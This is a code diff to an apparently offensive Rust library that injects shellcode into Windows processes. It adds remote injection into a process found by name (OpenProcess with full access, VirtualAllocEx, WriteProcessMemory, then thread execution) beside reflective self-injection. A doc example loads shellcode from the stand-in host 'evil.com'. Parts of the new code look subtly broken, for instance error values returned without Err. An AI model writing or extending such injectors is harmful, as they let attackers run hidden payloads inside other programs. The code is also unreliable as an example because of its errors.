@@ -14,9 +14,11 @@ use windows::{
             CloseHandle,
             GetLastError,
             HANDLE,
-            WIN32_ERROR
+            WIN32_ERROR,
+            BOOL
         },
         System::{
+            Diagnostics::Debug::WriteProcessMemory,
             Memory::{
                 VirtualAllocEx, 
                 VirtualProtectEx,
@@ -26,6 +28,7 @@ use windows::{
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READ,
             },
+            ProcessStatus::EnumProcesses,
             Threading::{
                 INFINITE,
                 OpenProcess,
@@ -36,10 +39,10 @@ use windows::{
                 PROCESS_ALL_ACCESS,
                 WaitForSingleObject
             }
-        },
+        }
     },
-    Win32::System::Diagnostics::Debug::WriteProcessMemory,
 };
+use sysinfo::{ProcessExt, System, SystemExt};
 
 // ================
 // Internal Modules
@@ -66,6 +69,15 @@ pub enum InjectorType {
 }
 
 ///
+/// The possible types of injections. Currently only 
+/// `Reflective` and `Remote` are supported.
+/// 
+pub enum InjectionType {
+    Reflective,
+    Remote(String)
+}
+
+///
 /// The `Injector` Trait comprises two functions: `inject()`, 
 /// which performs the specified injection, and `load()`, 
 /// which configures the Injector to load the shellcode from
@@ -76,7 +88,7 @@ pub enum InjectorType {
 /// 
 /// ```
 /// let url_injector = UrlInjector::new()
-///     .load(Url('https://evil.com/shellcode.bin')?;
+///     .load(Url("https://evil.com/shellcode.bin"))?;
 ///     
 /// url_injector.inject();
 /// ```
@@ -85,10 +97,10 @@ pub enum InjectorType {
 /// options to easily be built in the future.
 /// 
 pub trait Injector {
-    fn inject(&self);
-
     fn load(&self, sc_source: InjectorType) -> Self;
-        
+    
+    fn inject(&self, injection_type: InjectionType, wait: bool);
+    
 }
 #[derive(Debug)]
 pub struct InjectorError(String);
@@ -105,7 +117,7 @@ impl fmt::Display for InjectorError {
 /// The generic function to write memory to either
 /// our own our another process, depending on the handle.
 /// 
-pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) {
+pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) -> Result<(), InjectorError> {
 
     let sc_len = sc.len();
     let mut n = 0;
@@ -139,12 +151,14 @@ pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wa
         if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
             println!("Good!");
             println!("Injection completed!");
-            return;
+            Ok(())
         } else {
             let error = GetLastError();
             println!("{:?}", error);
-            return;
+            InjectorError("Could not inject!".to_string())
         }
+    } else {
+        Ok(())
     }
 
 }
@@ -152,10 +166,38 @@ pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wa
 ///
 /// Performs reflective injection.
 ///  
-pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) {
+pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) -> Result<(), InjectorError> {
     let h: HANDLE = GetCurrentProcess();
     let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
     write_mem(sc, h, addr, wait)
+       
+}
+
+///
+/// Performs remote injection.
+/// 
+/// Will attempt to find a process with the given name and inject.
+///  
+pub unsafe fn remote_inject(sc: &Vec<u8>, process_name: &str, wait: bool) -> Result<(), InjectorError>{
+
+
+    // Enumerate processes
+    let sys = System::new_all();
+    let process_matches = sys.processes()
+        .iter()
+        .filter(|(&pid, &proc)| proc.name() == process_name );
+
+    match process_matches.nth(0) {
+        Some((pid, proc)) => {
+            let h: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid.to_owned().as_u32());
+            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);              
+            write_mem(sc, h, addr, wait)
+        },
+        None => InjectorError("Could not find matching process!".to_string())
+    }
+    
+
+
        
 }
